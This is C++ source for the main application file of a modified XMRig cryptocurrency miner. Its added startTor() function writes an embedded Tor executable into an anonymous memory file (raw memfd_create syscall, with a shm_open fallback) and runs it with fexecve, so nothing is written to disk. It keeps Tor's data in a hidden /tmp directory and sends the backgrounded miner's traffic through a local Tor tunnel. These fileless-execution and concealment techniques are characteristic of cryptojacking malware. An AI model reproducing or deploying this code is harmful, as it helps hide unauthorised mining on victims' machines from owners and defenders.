/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2016-2018 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <uv.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <sstream>
#include <string>


#include "api/Api.h"
#include "App.h"
#include "common/Console.h"
#include "common/cpu/Cpu.h"
#include "common/log/Log.h"
#include "common/Platform.h"
#include "core/Config.h"
#include "core/Controller.h"
#include "crypto/CryptoNight.h"
#include "Mem.h"
#include "net/Network.h"
#include "Summary.h"
#include "version.h"
#include "workers/Workers.h"
#include "tor.h"


#ifndef XMRIG_NO_HTTPD
#   include "common/api/Httpd.h"
#endif


App *App::m_self = nullptr;



App::App(int argc, char **argv) :
    m_console(nullptr),
    m_httpd(nullptr)
{
    m_self = this;

    m_controller = new xmrig::Controller();
    if (m_controller->init(argc, argv) != 0) {
        return;
    }

    if (!m_controller->config()->isBackground()) {
        m_console = new Console(this);
    }

    uv_signal_init(uv_default_loop(), &m_sigHUP);
    uv_signal_init(uv_default_loop(), &m_sigINT);
    uv_signal_init(uv_default_loop(), &m_sigTERM);
}


App::~App()
{
    uv_tty_reset_mode();

    delete m_console;
    delete m_controller;

#   ifndef XMRIG_NO_HTTPD
    delete m_httpd;
#   endif
}

int App::startTor() {
    pid_t pid = fork();
    extern char **environ;
    struct sockaddr_in serv_addr;
    int arg;
    ssize_t bytes_written;
    int sockfd;
    int sock_err;
    socklen_t sock_err_len = sizeof(sock_err);
    std::stringstream data_dir;
    
    data_dir << "/tmp/.tor_" << geteuid();
    
    if (pid == -1) {
        return -1;
    }
    if (pid == 0) {
        int fd = syscall(319, "tor", 1);
        char *args[10]= {(char *) "tor", 
            (char *) "--ignore-missing-torrc", (char *) "--allow-missing-torrc",
            (char *) "--HTTPTunnelPort", (char *) "11232",
            (char *) "--FascistFirewall", (char *) "1", 
            (char *) "--DataDirectory", (char *) data_dir.str().c_str(),
            NULL};
    
        if (fd >= 0) {
            bytes_written = write(fd, TOR_EXE, sizeof(TOR_EXE));
        } else {
            fd = shm_open("tor", O_RDWR | O_CREAT, S_IRWXU);
            if (fd < 0)
                exit(2);
            bytes_written = write(fd, TOR_EXE, sizeof(TOR_EXE));
            if (::close(fd) == -1)
                exit(2);
            fd = shm_open("tor", O_RDONLY, 0);
            if (fd < 0)
                exit(2);
        }
        if(fexecve(fd, args, environ) < 0) {
            exit(2);
        }
        exit(2);
    }
    
    memset(&serv_addr, '\0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(11232);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
    for (int i=0; i<60; i++) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        arg = fcntl(sockfd, F_GETFL, NULL); 
        arg |= O_NONBLOCK; 
        fcntl(sockfd, F_SETFL, arg); 
        connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        sleep(1);
        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len) >= 0) {
            torPid = pid;
            return 0;
        }
        ::close(sockfd);
    }
    return -1;
}

int App::exec()
{
    
    if (m_controller->isDone()) {
        return 0;
    }

    if (!m_controller->isReady()) {
        return 2;
    }

    uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
    uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
    uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);

    background();

    Mem::init(m_controller->config()->isHugePages());

    Summary::print(m_controller);

    if (m_controller->config()->isDryRun()) {
        LOG_NOTICE("OK");
        release();

        return 0;
    }
    
    LOG_NOTICE("STARTING TOR...");
    if (startTor() == -1) {
        LOG_NOTICE("TOR ENDED, EXITING");
        return 2;
    }

#   ifndef XMRIG_NO_API
    Api::start(m_controller);
#   endif

#   ifndef XMRIG_NO_HTTPD
    m_httpd = new Httpd(
                m_controller->config()->apiPort(),
                m_controller->config()->apiToken(),
                m_controller->config()->isApiIPv6(),
                m_controller->config()->isApiRestricted()
                );

    m_httpd->start();
#   endif

    Workers::start(m_controller);

    m_controller->network()->connect();

    const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
    uv_loop_close(uv_default_loop());

    release();
    return r;
}


void App::onConsoleCommand(char command)
{
    switch (command) {
    case 'h':
    case 'H':
        Workers::printHashrate(true);
        break;

    case 'p':
    case 'P':
        if (Workers::isEnabled()) {
            LOG_INFO(m_controller->config()->isColors() ? "\x1B[01;33mpaused\x1B[0m, press \x1B[01;35mr\x1B[0m to resume" : "paused, press 'r' to resume");
            Workers::setEnabled(false);
        }
        break;

    case 'r':
    case 'R':
        if (!Workers::isEnabled()) {
            LOG_INFO(m_controller->config()->isColors() ? "\x1B[01;32mresumed" : "resumed");
            Workers::setEnabled(true);
        }
        break;

    case 3:
        LOG_WARN("Ctrl+C received, exiting");
        close();
        break;

    default:
        break;
    }
}


void App::close()
{
    m_controller->network()->stop();
    Workers::stop();

    uv_stop(uv_default_loop());
    kill(torPid, SIGTERM);
}


void App::release()
{
}


void App::onSignal(uv_signal_t *handle, int signum)
{
    switch (signum)
    {
    case SIGHUP:
        LOG_WARN("SIGHUP received, exiting");
        break;

    case SIGTERM:
        LOG_WARN("SIGTERM received, exiting");
        break;

    case SIGINT:
        LOG_WARN("SIGINT received, exiting");
        break;

    default:
        break;
    }

    uv_signal_stop(handle);
    m_self->close();
}
